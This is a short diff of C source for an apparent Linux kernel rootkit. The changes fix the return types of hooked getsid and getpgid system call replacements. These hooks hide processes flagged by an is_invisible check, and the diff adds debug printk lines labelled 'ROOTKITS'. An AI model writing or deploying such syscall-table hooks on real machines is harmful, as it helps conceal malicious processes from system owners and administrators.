@@ -60,8 +60,8 @@ static unsigned long *__sys_call_table;
 		struct linux_dirent64 *, unsigned int);
 	typedef asmlinkage int (*orig_kill_t)(pid_t, int);
 
-	typedef asmlinkage int (*orig_getsid_t)(pid_t pid);
-	typedef asmlinkage int (*orig_getpgid_t)(pid_t pid);
+	typedef asmlinkage long (*orig_getsid_t)(pid_t pid);
+	typedef asmlinkage long (*orig_getpgid_t)(pid_t pid);
 
 	static orig_getsid_t orig_getsid;
 	static orig_getpgid_t orig_getpgid;
@@ -127,7 +127,7 @@ is_invisible(pid_t pid)
 	return 0;
 }
 
-asmlinkage int hacked_getsid(pid_t pid) {
+asmlinkage long hacked_getsid(pid_t pid) {
     // Add your debug message
     printk(KERN_INFO "ROOTKITS: hacked_getsid called with pid=%d\n", pid);
 	printk(KERN_INFO "ROOTKITS: is_invisible(pid) = %d\n", is_invisible(pid));
@@ -141,7 +141,7 @@ asmlinkage int hacked_getsid(pid_t pid) {
     return orig_getsid(pid);
 }
 
-asmlinkage int hacked_getpgid(pid_t pid) {
+asmlinkage long hacked_getpgid(pid_t pid) {
     // Add your debug message
     printk(KERN_INFO "ROOTKITS: hacked_getpgid called with pid=%d\n", pid);
 
